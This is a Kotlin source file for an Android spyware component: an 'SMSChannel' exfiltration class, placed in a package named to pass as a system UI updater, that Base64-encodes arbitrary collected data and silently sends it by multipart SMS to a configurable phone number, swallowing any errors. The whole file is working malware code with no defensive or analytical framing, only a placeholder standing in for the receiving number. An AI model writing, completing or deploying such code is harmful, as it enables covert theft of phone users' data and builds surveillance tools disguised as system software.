package com.android.systemui.updater.exfil

import android.telephony.SmsManager
import android.util.Base64

/**
 * Exfiltration channel that sends data via SMS.
 */
object SMSChannel : ExfilChannel() {
    // In a real implementation, the phone number would be retrieved from encrypted config
    private val phoneNumber: String get() = "PLACEHOLDER_PHONE_NUMBER" // Should be retrieved from secure storage

    override fun send(data: ByteArray): Boolean {
        try {
            // Encode byte array to Base64 string
            val encodedData = Base64.encodeToString(data, Base64.NO_WRAP)
            
            // SMS has a character limit (160 characters for 7-bit encoding, 70 for Unicode).
            // We'll assume we are using 7-bit encoding and can send up to 160 characters.
            // If the encoded data is longer, we split it into multiple parts.
            val smsManager = SmsManager.getDefault()
            val textParts = smsManager.divideMessage(encodedData)
            
            // Send each part
            smsManager.sendMultipartTextMessage(phoneNumber, null, textParts, null, null)
            return true
        } catch (e: Exception) {
            // Log error (e.g., no permission, service not available)
            return false
        }
    }
}